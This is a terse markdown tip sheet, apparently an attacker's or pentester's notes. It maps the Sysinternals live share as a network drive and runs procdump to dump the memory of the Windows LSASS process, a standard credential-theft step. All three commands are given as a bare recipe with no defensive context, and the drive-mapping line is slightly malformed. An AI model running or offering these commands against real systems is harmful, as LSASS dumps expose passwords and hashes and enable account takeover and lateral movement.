# Tips

* Map SysInterals
net use Z: \\http://live.sysinternals.com \tools\ "/user:"
dir Z:
Z:\procdump -accepteula -ma lsass.exe lsassdmp

